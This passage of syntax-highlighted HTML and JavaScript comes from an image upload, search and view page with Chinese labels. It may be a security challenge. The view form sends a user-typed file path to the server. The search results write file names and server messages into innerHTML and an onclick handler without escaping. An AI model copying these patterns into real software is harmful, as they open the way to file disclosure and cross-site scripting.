class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>上传图片<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uploadResult<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>搜索图片<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>searchForm<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>搜索关键词：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">required</span>                        <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[a-zA-Z0-9]+<span class="token punctuation">"</span></span>                        <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>只允许输入数字和字母<span class="token punctuation">"</span></span>                       <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>输入图片关键词（仅限数字和字母）<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>searchResult<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>搜索结果：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>searchResultContent<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>查看图片<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewForm<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>view<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>图片路径：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>输入图片路径<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>查看图片<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewResult<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>图片预览：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fileContent<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'uploadForm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>                <span class="token literal-property property">body</span><span class="token operator">:</span> formData            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> resultDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'uploadResult'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> data<span class="token punctuation">.</span>message<span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> data<span class="token punctuation">.</span>success <span class="token operator">?</span> <span class="token string">'green'</span> <span class="token operator">:</span> <span class="token string">'red'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> resultDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'uploadResult'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'上传过程中发生错误'</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">'red'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchForm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">var</span> searchQuery <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>                        <span class="token keyword">var</span> alphanumericRegex <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[a-zA-Z0-9]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>alphanumericRegex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>searchQuery<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> resultDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchResult'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchResultContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;p style="color: red;"&gt;只允许输入数字和字母&lt;/p&gt;'</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>                        <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>                <span class="token literal-property property">body</span><span class="token operator">:</span> formData            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> resultDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchResult'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        <span class="token keyword">var</span> jsonData <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token keyword">if</span> <span class="token punctuation">(</span>jsonData<span class="token punctuation">.</span>paths <span class="token operator">&amp;&amp;</span> jsonData<span class="token punctuation">.</span>paths<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">var</span> resultHtml <span class="token operator">=</span> <span class="token string">'&lt;table style="width:100%; border-collapse: collapse;"&gt;'</span><span class="token punctuation">;</span>                            resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;thead&gt;&lt;tr style="background-color: #f2f2f2;"&gt;'</span><span class="token punctuation">;</span>                            resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;th style="text-align: left; padding: 8px; border: 1px solid #ddd;"&gt;名称&lt;/th&gt;'</span><span class="token punctuation">;</span>                            resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;th style="text-align: left; padding: 8px; border: 1px solid #ddd;"&gt;修改时间&lt;/th&gt;'</span><span class="token punctuation">;</span>                            resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;th style="text-align: left; padding: 8px; border: 1px solid #ddd;"&gt;大小&lt;/th&gt;'</span><span class="token punctuation">;</span>                            resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;th style="text-align: left; padding: 8px; border: 1px solid #ddd;"&gt;操作&lt;/th&gt;'</span><span class="token punctuation">;</span>                            resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;'</span><span class="token punctuation">;</span>                                                        jsonData<span class="token punctuation">.</span>paths<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">var</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>mtime<span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">var</span> formattedDate <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">var</span> fileSize <span class="token operator">=</span> <span class="token function">formatFileSize</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;tr style="border: 1px solid #ddd;"&gt;'</span><span class="token punctuation">;</span>                                resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;td style="padding: 8px; border: 1px solid #ddd;"&gt;'</span> <span class="token operator">+</span> item<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span><span class="token punctuation">;</span>                                resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;td style="padding: 8px; border: 1px solid #ddd;"&gt;'</span> <span class="token operator">+</span> formattedDate <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span><span class="token punctuation">;</span>                                resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;td style="padding: 8px; border: 1px solid #ddd;"&gt;'</span> <span class="token operator">+</span> fileSize <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span><span class="token punctuation">;</span>                                resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;td style="padding: 8px; border: 1px solid #ddd;"&gt;'</span><span class="token punctuation">;</span>                                resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;button onclick="viewFile(\''</span> <span class="token operator">+</span> item<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'\')" style="margin-right: 5px;"&gt;查看&lt;/button&gt;'</span><span class="token punctuation">;</span>                                resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;/td&gt;&lt;/tr&gt;'</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        resultHtml <span class="token operator">+=</span> <span class="token string">'&lt;/tbody&gt;&lt;/table&gt;'</span><span class="token punctuation">;</span>                            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchResultContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> resultHtml<span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchResultContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;p&gt;没有找到匹配的图片&lt;/p&gt;'</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchResultContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;p&gt;解析结果时出错&lt;/p&gt;'</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchResultContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;p&gt;错误: '</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">'&lt;/p&gt;'</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> resultDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchResult'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchResultContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;p&gt;搜索过程中发生错误&lt;/p&gt;'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'viewForm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>                <span class="token literal-property property">body</span><span class="token operator">:</span> formData            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> resultDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'viewResult'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">var</span> fileContentDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'fileContent'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    fileContentDiv<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>                     <span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    img<span class="token punctuation">.</span>src <span class="token operator">=</span> data<span class="token punctuation">.</span>base64_data<span class="token punctuation">;</span>                    img<span class="token punctuation">.</span>style<span class="token punctuation">.</span>maxWidth <span class="token operator">=</span> <span class="token string">'100%'</span><span class="token punctuation">;</span>                    img<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>                    img<span class="token punctuation">.</span>style<span class="token punctuation">.</span>margin <span class="token operator">=</span> <span class="token string">'0 auto'</span><span class="token punctuation">;</span>                    fileContentDiv<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'fileContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'错误: '</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>message<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'错误:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> resultDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'viewResult'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'fileContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'获取图片时发生错误'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 